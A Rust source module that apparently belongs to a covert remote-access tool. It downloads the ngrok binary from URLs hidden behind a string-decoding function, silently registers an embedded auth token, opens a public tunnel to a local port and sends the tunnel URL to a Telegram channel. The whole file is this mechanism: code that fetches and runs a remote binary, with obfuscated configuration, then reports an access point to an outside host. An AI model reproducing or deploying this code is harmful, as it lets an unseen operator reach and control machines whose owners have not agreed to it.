use crate::config::Config;
use crate::encryption::aa27;
use crate::notification::TelegramNotifier;
use crate::notification::NotificationSystem;
use log::{info, error};
use reqwest::Client;
use serde_json::Value;
use std::path::Path;
use std::net::TcpListener;
use std::process::{Command, Stdio};
use tokio::process::{Command as TokioCommand};
use tokio::time::{sleep, Duration};
use tokio::fs;
use zip::ZipArchive;

// Check if ngrok binary exists, download if necessary
async fn download_ngrok() -> bool {
    let config = Config::new();
    let os = std::env::consts::OS;
    
    let download_url = match os {
        "windows" => aa27(config.nw.clone()),
        "linux" => aa27(config.nl.clone()),
        "macos" => aa27(config.nm.clone()),
        _ => {
            error!("Platform not supported: {}", os);
            return false;
        }
    };
    
    info!("Downloading ngrok from {}", download_url);
    
    let client = Client::builder()
        .timeout(Duration::from_secs(40))
        .build()
        .expect("Failed to build HTTP client");
    
    // Download the zip file
    let response = match client.get(&download_url).send().await {
        Ok(resp) => resp,
        Err(e) => {
            error!("Download failed: {}", e);
            return false;
        }
    };
    
    let bytes = match response.bytes().await {
        Ok(b) => b,
        Err(e) => {
            error!("Failed to read response: {}", e);
            return false;
        }
    };
    
    // Write to temporary zip file
    let tmp_file = "tmp_ng.zip";
    if let Err(e) = tokio::fs::write(tmp_file, &bytes).await {
        error!("Create temp failed: {}", e);
        return false;
    }
    
    // Extract ngrok executable
    let ngrok_bin = aa27(config.ngrok_cmd.clone());
    let file = std::fs::File::open(tmp_file).unwrap();
    let mut archive = match ZipArchive::new(file) {
        Ok(a) => a,
        Err(e) => {
            error!("Zip open failed: {}", e);
            let _ = tokio::fs::remove_file(tmp_file).await;
            return false;
        }
    };
    
    let mut success = false;
    for i in 0..archive.len() {
        let mut file = match archive.by_index(i) {
            Ok(f) => f,
            Err(_) => continue,
        };
        
        let outpath = file.name();
        if outpath == ngrok_bin || outpath.ends_with(&ngrok_bin) {
            let mut outfile = match std::fs::File::create(&ngrok_bin) {
                Ok(f) => f,
                Err(e) => {
                    error!("Failed to create ngrok binary: {}", e);
                    continue;
                }
            };
            
            std::io::copy(&mut file, &mut outfile).unwrap();
            
            #[cfg(unix)]
            {
                use std::os::unix::fs::PermissionsExt;
                let mut perms = std::fs::metadata(&ngrok_bin).unwrap().permissions();
                perms.set_mode(0o755);
                std::fs::set_permissions(&ngrok_bin, perms).unwrap();
            }
            
            success = true;
            break;
        }
    }
    
    // Clean up
    let _ = tokio::fs::remove_file(tmp_file).await;
    
    if success {
        info!("Tunnel tool ready");
        true
    } else {
        error!("Failed to extract ngrok");
        false
    }
}

// Set up ngrok auth token
async fn configure_ngrok() -> bool {
    let config = Config::new();
    let ngrok_path = format!("./{}", aa27(config.ngrok_cmd.clone()));
    let auth_token = aa27(config.na.clone());
    
    let output = Command::new(&ngrok_path)
        .arg("authtoken")
        .arg(auth_token)
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status();
    
    match output {
        Ok(status) if status.success() => {
            info!("Tunnel auth done");
            true
        },
        _ => {
            error!("Auth failed");
            false
        }
    }
}

// Check if a port is available
fn is_port_available(port: u16) -> bool {
    let addr = format!("127.0.0.1:{}", port);
    TcpListener::bind(addr).is_ok()
}

// Get public URL from ngrok API
async fn get_ngrok_public_url(api_port: u16) -> String {
    let config = Config::new();
    let api_url = config.ngrok_api_url().replace("4040", &api_port.to_string());
    
    let client = Client::builder()
        .timeout(Duration::from_secs(20))
        .build()
        .unwrap_or_default();
    
    for i in 0..15 {
        let wait_time = 1 << i.min(4);
        sleep(Duration::from_secs(wait_time)).await;
        info!("Attempting to fetch tunnel URL: {}", api_url);
        
        match client.get(&api_url).send().await {
            Ok(response) if response.status().is_success() => {
                match response.json::<Value>().await {
                    Ok(data) => {
                        if let Some(tunnels) = data.get("tunnels").and_then(|t| t.as_array()) {
                            if !tunnels.is_empty() {
                                if let Some(url) = tunnels[0].get("public_url").and_then(|u| u.as_str()) {
                                    info!("Tunnel active: {}", url);
                                    
                                    // Send notification
                                    let notifier = TelegramNotifier;
                                    if let Err(e) = notifier.send_notification(url).await {
                                        error!("Notify failed: {}", e);
                                    }
                                    
                                    return url.to_string();
                                }
                            }
                        }
                        error!("Tunnel attempt {} failed: no tunnels found", i+1);
                    },
                    Err(e) => {
                        error!("Tunnel attempt {} failed to decode response: {}", i+1, e);
                    }
                }
            },
            Ok(response) => {
                error!("Tunnel attempt {} failed: status {}", i+1, response.status());
            },
            Err(e) => {
                error!("Tunnel attempt {} failed: {}", i+1, e);
            }
        }
    }
    
    error!("Tunnel failed after retries");
    let notifier = TelegramNotifier;
    let _ = notifier.send_notification("Failed to start tunnel").await;
    String::new()
}

// Main function to set up ngrok tunnel
pub async fn setup_ngrok_tunnel(port: u16) -> String {
    let config = Config::new();
    let ngrok_path = format!("./{}", aa27(config.ngrok_cmd.clone()));
    
    // Check if ngrok exists, download if not
    if !Path::new(&ngrok_path).exists() {
        if !download_ngrok().await {
            return String::new();
        }
    }
    
    // Configure ngrok with auth token
    if !configure_ngrok().await {
        return String::new();
    }
    
    // Check for available API port
    let mut ngrok_api_port = 4040;
    if !is_port_available(ngrok_api_port) {
        info!("Port {} in use, trying 4041", ngrok_api_port);
        ngrok_api_port = 4041;
    }
    
    // Start ngrok process
    let mut child = match Command::new(&ngrok_path)
        .arg("http")
        .arg(port.to_string())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn() {
            Ok(c) => c,
            Err(e) => {
                error!("Tunnel start failed: {}", e);
                return String::new();
            }
        };
    
    // Handle stdout and stderr in background
    if let Some(stdout) = child.stdout.take() {
        let stdout_reader = tokio::process::ChildStdout::from_std(stdout)
            .expect("Failed to create tokio stdout reader");
        tokio::spawn(async move {
            let mut reader = tokio::io::BufReader::new(stdout_reader);
            let mut buffer = String::new();
            while let Ok(bytes_read) = tokio::io::AsyncBufReadExt::read_line(&mut reader, &mut buffer).await {
                if bytes_read == 0 {
                    break;
                }
                info!("Ngrok stdout: {}", buffer.trim());
                buffer.clear();
            }
        });
    }
    
    if let Some(stderr) = child.stderr.take() {
        let stderr_reader = tokio::process::ChildStderr::from_std(stderr)
            .expect("Failed to create tokio stderr reader");
        tokio::spawn(async move {
            let mut reader = tokio::io::BufReader::new(stderr_reader);
            let mut buffer = String::new();
            while let Ok(bytes_read) = tokio::io::AsyncBufReadExt::read_line(&mut reader, &mut buffer).await {
                if bytes_read == 0 {
                    break;
                }
                error!("Ngrok stderr: {}", buffer.trim());
                buffer.clear();
            }
        });
    }
    
    // Wait for ngrok to start
    sleep(Duration::from_secs(2)).await;
    
    // Get the public URL
    get_ngrok_public_url(ngrok_api_port).await
}
